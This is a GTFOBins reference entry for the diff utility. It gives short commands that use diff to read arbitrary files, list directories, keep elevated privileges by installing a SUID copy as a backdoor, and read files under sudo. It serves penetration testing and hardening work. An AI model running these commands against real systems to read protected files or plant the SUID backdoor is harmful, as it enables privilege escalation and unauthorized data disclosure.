# GTFOBin: diff

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
LFILE=file_to_read
diff --line-format=%L /dev/null $LFILE
```

This lists the content of a directory. `$TF` can be any directory, but for convenience it is better to use an empty directory to avoid noise output.

```
LFOLDER=folder_to_list
TF=$(mktemp -d)
diff --recursive $TF $LFOLDER
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which diff) .

LFILE=file_to_read
./diff --line-format=%L /dev/null $LFILE
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
LFILE=file_to_read
sudo diff --line-format=%L /dev/null $LFILE
```